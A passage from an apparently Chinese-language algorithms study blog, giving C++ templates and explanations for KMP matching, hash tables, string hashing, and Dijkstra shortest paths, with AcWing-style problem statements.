class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>,M=<span class="hljs-number">1000010</span>;<br><span class="hljs-type">int</span> n,m,ne[N];<br><span class="hljs-type">char</span> p[N],s[M];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;p+<span class="hljs-number">1</span>&gt;&gt;m&gt;&gt;s+<span class="hljs-number">1</span>;<span class="hljs-comment">//kmp算法通常都是以下标为1开始</span><br><br>    <span class="hljs-comment">//j从下标零开始,是因为我们要判断的是p[j+1]是否等于p[i]，如果是p[j]与p[i]比较，那么当</span><br>    <span class="hljs-comment">//p[j]与p[i]不匹配的时候,就找不到最长的前后缀匹配和了</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>,j=<span class="hljs-number">0</span>;i&lt;=n;i++)<span class="hljs-comment">//因为p的第一个ne[1]=0的，所以从第二个开始</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(j&amp;&amp;p[i]!=p[j+<span class="hljs-number">1</span>]) j=ne[j];<br>        <span class="hljs-keyword">if</span>(p[i]==p[j+<span class="hljs-number">1</span>]) j++;<br>        ne[i]=j;<br>    &#125;<br><br>    <span class="hljs-comment">//kmp匹配</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>,j=<span class="hljs-number">0</span>;i&lt;=m;i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(j&amp;&amp;s[i]!=p[j+<span class="hljs-number">1</span>]) j=ne[j];<br>        <span class="hljs-keyword">if</span>(s[i]==p[j+<span class="hljs-number">1</span>]) j++;<br>        <span class="hljs-keyword">if</span>(j==n)<br>        &#123;<br>            cout&lt;&lt;i-n&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        &#125;<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="trie">Trie</h1><h1 id="哈希表">哈希表</h1><h2 id="拉链法">拉链法</h2><figure><imgsrc="https://cdn.acwing.com/media/article/image/2021/01/17/2675_9b33804c58-4.jpg"alt="https://cdn.acwing.com/media/article/image/2021/01/17/2675_9b33804c58-4.jpg" /><figcaptionaria-hidden="true">https://cdn.acwing.com/media/article/image/2021/01/17/2675_9b33804c58-4.jpg</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> h[N],ne[N],e[N],idx,n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-comment">//为什么x%N后还要加N，因为在c++中-10mod3=-1，所以要把负数映射到正数</span><br>    e[idx]=x;<span class="hljs-comment">//单链表求法</span><br>    ne[idx]=h[k];<br>    h[k]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">bool</span> flag=<span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[k];i!=<span class="hljs-number">-1</span>;i=ne[i])<br>    &#123;<br>        <span class="hljs-keyword">if</span>(e[i]==x)&#123;<span class="hljs-comment">//找到后就可以返回查询结果</span><br>            flag=<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        string op;<br>        cin&gt;&gt;op&gt;&gt;x;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>) <span class="hljs-built_in">insert</span>(x);<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">query</span>(x)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="开放寻址法">开放寻址法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">200003</span>,null=<span class="hljs-number">0x3f3f3f3f</span>;<span class="hljs-comment">//通常要比询问次数的范围大2-3倍，同时还是质数</span><br><span class="hljs-comment">//0x3f3f3f3f可以作为无穷大来比较</span><br><span class="hljs-type">int</span> h[N],n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> k=(x%N+N)%N;<br>    <span class="hljs-keyword">while</span>(h[k]!=null&amp;&amp;h[k]!=x)<br>    &#123;<br>        k++;<br>        <span class="hljs-keyword">if</span>(k==N) k=<span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> k;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string op;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;op&gt;&gt;x;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> k=<span class="hljs-built_in">find</span>(x);<br>            h[k]=x;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(h[<span class="hljs-built_in">find</span>(x)]==null) cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="字符串哈希表">字符串哈希表</h2><p>(字符串哈希) O(n)+O(m)全称字符串前缀哈希法，把字符串变成一个p进制数字（哈希值），实现不同的字符串映射到不同的数字。对形如 X1X2X3⋯Xn−1Xn的字符串,采用字符的ascii 码乘上 P的次方来计算哈希值。</p><p>映射公式 (X1×Pn−1+X2×Pn−2+⋯+Xn−1×P1+Xn×P0)modQ 注意点：</p><ol type="1"><li>任意字符不可以映射成0，否则会出现不同的字符串都映射成0的情况，比如A,AA,AAA皆为0</li><li>冲突问题：通过巧妙设置P (131 或 13331) , Q(264)(264)的值，一般可以理解为不产生冲突。</li></ol><p>问题是比较不同区间的子串是否相同，就转化为对应的哈希值是否相同。求一个字符串的哈希值就相当于求前缀和，求一个字符串的子串哈希值就相当于求部分和。</p><p>前缀和公式 h[i+1]=h[i]×P+s[i]h[i+1]=h[i]×P+s[i] i∈[0,n−1]i∈[0,n−1]h为前缀和数组，s为字符串数组 区间和公式h[l,r]=h[r]−h[l−1]×Pr−l+1h[l,r]=h[r]−h[l−1]×Pr−l+1 区间和公式的理解:ABCDE 与 ABC 的前三个字符值是一样，只差两位， 乘上 P2P2 把 ABC 变为ABC00，再用 ABCDE - ABC00 得到 DE 的哈希值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ull;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>,P=<span class="hljs-number">131</span>;<br><span class="hljs-type">char</span> str[N];<br>ull p[N],h[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">get_val</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> h[r]-h[l<span class="hljs-number">-1</span>]*p[r-l+<span class="hljs-number">1</span>];<br>    <span class="hljs-comment">//利用求区间和的思想，但是h[l-1]位次比h[r]低，所以需要将h[l-1]左移</span><br>    <span class="hljs-comment">//比如h[l-1]=AB,h[r]=ABCD,那么h[l-1]*p[r-l+1]就相当于ABCD-AB00=CD</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,str+<span class="hljs-number">1</span>);<br>    p[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        p[i]=p[i<span class="hljs-number">-1</span>]*P;<span class="hljs-comment">//求出每项的系数是多少</span><br>        h[i]=h[i<span class="hljs-number">-1</span>]*P+str[i];<span class="hljs-comment">//前缀和思想这个可以理解成2*5^n-1+3*5^n-2……</span><br>    &#125;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> l1,r1,l2,r2;<br>        cin&gt;&gt;l1&gt;&gt;r1&gt;&gt;l2&gt;&gt;r2;<br>        <span class="hljs-comment">//判断两个字符串的哈希值是否相同，如果相同代表字符串完全相同</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">get_val</span>(l1,r1)==<span class="hljs-built_in">get_val</span>(l2,r2)) cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在计算最短路时，Dijkstra算法不能处理带有负权的图，bellman_ford和spfa可以处理带有负权边的图，spfa是对bellman_ford的优化。</p><h1 id="图论">图论</h1><h2 id="dijkstra算法">Dijkstra算法</h2><p><strong>在Dijkstra算法中，稠密图使用邻接矩阵，稀疏图使用邻接表</strong></p><h3 id="朴素dijkstra算法">朴素Dijkstra算法</h3><p><strong>在使用Dijkstra算法时，如果有向图中出现重边或者是有环的话，只采用代价最小的边</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环，所有边权均为正值。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 −<span class="hljs-number">1</span>。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。<br>如果路径不存在，则输出 −<span class="hljs-number">1</span>。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">500</span>,<br><span class="hljs-number">1</span>≤m≤<span class="hljs-number">105</span>,<br>图中涉及边长均不超过<span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>;<br><span class="hljs-type">int</span> n,m,g[N][N],dist[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-type">int</span> t=<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            <span class="hljs-keyword">if</span>(!st[j]&amp;&amp;(t==<span class="hljs-number">-1</span>||dist[t]&gt;dist[j]))<br>                t=j;<br>        st[t]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            dist[j]=<span class="hljs-built_in">min</span>(dist[j],dist[t]+g[t][j]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-built_in">memset</span>(g,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> g);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        g[a][b]=<span class="hljs-built_in">min</span>(g[a][b],c);<br>    &#125;<br>    <span class="hljs-type">int</span> t = <span class="hljs-built_in">dijkstra</span>();<br>    cout&lt;&lt;t&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="堆优化dijkstra算法">堆优化Dijkstra算法</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环，所有边权均为非负值。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 −<span class="hljs-number">1</span>。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。如果路径不存在，则输出 −<span class="hljs-number">1</span>。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">1.5</span>×<span class="hljs-number">105</span>,<br>图中涉及边长均不小于 <span class="hljs-number">0</span>，且不超过 <span class="hljs-number">10000</span>。数据保证：如果最短路存在，则最短路的长度不超过 <span class="hljs-number">109</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2e5</span>;<br><span class="hljs-type">int</span> h[N],n,m,ne[N],val[N],idx,w[N],dist[N];<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=b;<br>    w[idx]=c;<br>    ne[idx]=h[a];<br>    h[a]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<span class="hljs-comment">//默认将dist置为最大</span><br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//将第一个点置为0</span><br>    priority_queue&lt;PII,vector&lt;PII&gt;,greater&lt;PII&gt;&gt;q;<span class="hljs-comment">//设置堆</span><br>    q.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())<span class="hljs-comment">//堆不为空就循环</span><br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.<span class="hljs-built_in">top</span>();<span class="hljs-comment">//取出堆首元素</span><br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> ver = t.second,distance = t.first;<br>        <span class="hljs-keyword">if</span>(state[ver]) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果访问到已经最优的结点就进行下次循环</span><br>        state[ver]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[ver];i!=<span class="hljs-number">-1</span>;i=ne[i])<span class="hljs-comment">//循环每一条可以访问的边</span><br>        &#123;<br>            <span class="hljs-type">int</span> j=val[i];<br>            <span class="hljs-keyword">if</span>(dist[j]&gt;dist[ver]+w[i])&#123; <span class="hljs-comment">// 如果满足更新条件就更新</span><br>                dist[j]=dist[ver]+w[i];<br>                q.<span class="hljs-built_in">push</span>(&#123;dist[j],j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-built_in">add</span>(a,b,c);<br>    &#125;<br>    <span class="hljs-keyword">auto</span> t=<span class="hljs-built_in">dijkstra</span>();<br>    cout&lt;&lt;t&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="bellman_ford">bellman_ford</h2><p>Bellman-ford算法是求含负权图的单源最短路径的一种算法，效率较低，代码难度较小。其原理为连续进行松弛，在每次松弛时把每条边都更新一下，若在n-1次松弛后还能更新，则说明图中有负环，因此无法得出结果，否则就完成。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环， 